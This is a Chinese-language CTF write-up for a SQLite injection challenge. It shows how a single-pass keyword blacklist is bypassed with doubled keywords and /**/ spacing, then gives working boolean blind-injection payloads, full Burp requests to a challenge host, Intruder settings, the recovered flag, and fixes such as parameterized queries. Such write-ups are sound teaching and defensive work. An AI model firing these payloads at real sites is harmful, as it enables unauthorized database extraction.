# 火影的注入 — WriteUp

| 项目 | 内容 |
|---|---|
| 分类 | Web / SQL 注入（SQLite，黑名单"一次过滤"绕过 + 布尔盲注） |
| 分值 | 1000 |
| 类型 | DynamicContainer |
| 入口 | `http://103.163.47.230:33704`（复现容器） |
| Flag | `HTUCTF{a3b37fa8-0f51-497b-86dc-e25c95246d5a}` |
| 复现脚本 | `solve_sqli.py`（一键盲注 dump）、`probe_filter.py`（过滤器行为探测） |

## 1. 题目与过滤规则

木叶档案馆，一个 `GET /?id=` 的查询框。页面提示把话说得很明白：

> 封印术巡逻队会剔除危险的查克拉——**可惜，每道封印只能生效一次**。

"每道封印只能生效一次" = 黑名单**只替换一次** → 经典的**双写绕过**。

实测出来的完整过滤表：

| 规则 | 表现 | 绕过 |
|---|---|---|
| 空格被删除 | `1 and 1` → 变成 `1and1`，查无此卷 | 用 `/**/`（或 Tab）代替空格 |
| `union` 删一次 | `union` → `""` | 写 `ununionion` → 过滤后剩 `union` |
| `select` 删一次 | 同上 | `seselectlect` |
| `and` 删一次 | 同上 | `anandd` |
| `or` 删一次 | 同上 | `oorr` |
| `id` 也被删（实测） | `cid=0` / `rowid=1` 都会变成 `c=0` / `row` 而报错 | 避开含 `id` 的标识符 |

> 判断"某个词被过滤"的方法：拿 `where 1` 做对照，把可疑词塞进去看结果是否异常。
> 比如 `where cid=0` 恒 FALSE 而 `where cid>-1` 恒 TRUE，就说明是 `id` 被吃了而不是没数据。

## 2. 布尔 oracle

结果页有两种形态：

```html
<!-- TRUE：有结果 -->
<div class="archive">
  <img class="archive-img" src="img/1.jpg" alt="封印档案">
</div>

<!-- FALSE -->
<div class="msg err">查无此卷，封印之室一片寂静。</div>
```

于是判据就是 `"archive-img" in html`。

`id=1..5` 有档案，`id=6+` 和 `id=0` 都是"查无此卷"——先记下这个 1~5 的范围，后面有用。

## 3. 列数与注入点

```python
# -1' ununionion seselectlect <cols>-- -
cols=1     -> False
cols=1,2   -> False
cols=1,3   -> (省略)
cols=1,2,3 -> True    ✅ 原查询是 3 列
cols=1,2,3,4 -> False
```

**列数 = 3**。注入模板定为：

```
-1' ununionion seselectlect 1,2,3 from <表> where <条件>-- -
```

（`-1` 让前半条查询落空，结果只由 union 后的部分决定；`-- -` 注释掉尾部引号。）

> ⚠️ **不能靠回显取数据**：第一列会被拼进 `<img src="img/{col1}.jpg">`，
> 而服务端只认 1~5 这几个已存在的图（`select 9,2,3` → FALSE，`select 'HELLO',2,3` → FALSE）。
> 所以这条路是**纯盲注**，只能布尔/时间，不能 UNION 显错。

## 4. 库内有什么

```python
for t in ("archives", "scrolls", "sqlite_master", "flag", "secrets", "ninja"):
    blind("1,2,3", t, "1")
```

存在的表：**`archives`**（5 卷公开档案）、**`scrolls`**（"最深的那一格"里的禁术卷轴）、`sqlite_master`。
`flag` / `secrets` 之类都不存在。

接着猜列名（列名写错 → SQLite 报 no such column → FALSE，天然列名 oracle）：

```python
for c in ("name", "title", "content", "secret", "flag", "note", "text"):
    blind("1,2,3", "scrolls", f"{c} like 'HTUCTF%'")
```

**命中 `scrolls.content`**。

## 5. 逐字符二分 dump

`=` 没被过滤，`substr` / `unicode` 也没被拦，于是用最朴素的二分布尔盲注：

```
-1'/**/ununionion/**/seselectlect/**/1,2,3/**/from/**/scrolls/**/where/**/unicode(substr((content),{pos},1))>{mid}-- -
```

- `unicode(substr(content,pos,1)) > 31` 为 FALSE 说明已到字符串末尾 → 停机
- 在 `[32,126]` 上二分，7 次请求定一个字符
- 用线程池把不同 `pos` 并发起来，45 个字符几秒钟出结果

```
HTUCTF{a3b37fa8-0f51-497b-86dc-e25c95246d5a}
```

## 6. Burp 复现（完整请求报文）

> 全部是 `GET /?id=`，**Repeater 一条就够**：改 `id` 参数值 → Send → 看右侧有没有 `archive-img`。
> 换容器只改 `Host`。
>
> ⚠️ **URL 编码**：`'` 写成 `%27`，空格（含 `-- -` 里那个）写成 `%20`，`/**/` 可直接原样发。
> 在 Repeater 里如果直接写中文/特殊字符容易被转义，建议先在 **Decoder** 里 URL-encode 好再粘。

### 6.1 基线（确认 oracle）

```http
GET /?id=1 HTTP/1.1
Host: 103.163.47.230:33704
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

Response 里有 `<img class="archive-img" src="img/1.jpg">` → **TRUE**。

换成 `id=0`：

```http
GET /?id=0 HTTP/1.1
Host: 103.163.47.230:33704
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

Response 是 `<div class="msg err">查无此卷，封印之室一片寂静。</div>` → **FALSE**。

判据就是 **`archive-img` 是否出现在响应里**。

### 6.2 探列数（3 列）

```http
GET /?id=-1%27/**/ununionion/**/seselectlect/**/1,2,3--%20- HTTP/1.1
Host: 103.163.47.230:33704
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

→ TRUE（有 `archive-img`）。把 `1,2,3` 换成 `1,2` 或 `1,2,3,4` 都是 FALSE，故**列数 = 3**。

> 说明：`ununionion` 被删掉中间一次 `union` 后正好剩 `union`；`seselectlect` 同理；
> 空格用 `/**/` 代替（服务端会删空格）。

### 6.3 逐字符二分 dump（以第 1 个字符为例）

```http
GET /?id=-1%27/**/ununionion/**/seselectlect/**/1,2,3/**/from/**/scrolls/**/where/**/unicode(substr((content),1,1))%3E64--%20- HTTP/1.1
Host: 103.163.47.230:33704
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

```

（`%3E` 是 `>`。）在 `[32,126]` 上二分，7 次请求定一个字符；
`unicode(substr(content,pos,1)) > 31` 为 FALSE 说明已到末尾，停机。

> 手工二分 45 个字符太累，**这一步建议用 Intruder**：
> - Attack type：**Sniper**
> - payload 位置：把上面报文里 `64` 和 `1,1` 中的 `1` 各设一个 § 标记（`pos` 与 `mid`）
> - 或者更简单：payload 位置只留 `mid`，`pos` 手改，一轮 7 次请求出一个字符
> - **Grep - Match** 填 `archive-img`，有匹配即 TRUE

### 6.4 结果

```
HTUCTF{a3b37fa8-0f51-497b-86dc-e25c95246d5a}
```

> `solve_sqli.py` 发的是**完全相同**的请求，只是把二分自动化并开了线程池；
> 其核心只有一句：`payload.replace(" ", "/**/")` 后拼到 `/?id=` 上。

## 7. 知识点：为什么"过滤"一定会被绕过

黑名单 WAF 的思路是"把危险词删掉"，但它有两个结构性缺陷：

1. **只删一次**：`union` 被删 → 输入 `ununionion`，删掉中间那次 `union` 后，
   **剩下的正好是 `union`**。凡是 `str.replace(word, "")` 只跑一遍的实现，都能被双写击穿。
   真正的过滤必须**循环到不含关键字为止**（`while re.search(...): clean = re.sub(...)`）。
2. **删空格不等于断词**：`/**/` 是 SQL 的块注释，MySQL/SQLite 都把它当空白；
   `uni/**/on`、`%09`(Tab)、`%0a`(换行) 都能拆开被匹配的词。

正确做法（也是本题唯一的根治方案）是**参数化查询**：

```python
cur.execute("SELECT * FROM archives WHERE id = ?", (user_id,))   # SQLite
```

过滤只是"让攻击变难"，不是"让攻击失效"。

## 8. 修复建议

- 用预编译/参数化查询，杜绝字符串拼接 SQL
- `id` 这类字段做强类型校验（`int(user_id)`），非法直接 400
- 结果集条数限制 + 错误信息不回显（关闭 debug）
- 数据库账号最小权限：档案库只读，且不要和 flag 表放同一个库/表
- 若一定要保留 WAF：循环清洗 + 归一化（去注释、折叠空白）后再匹配，
  并且**在清洗后再校验一遍**，而不是清洗一次就放行
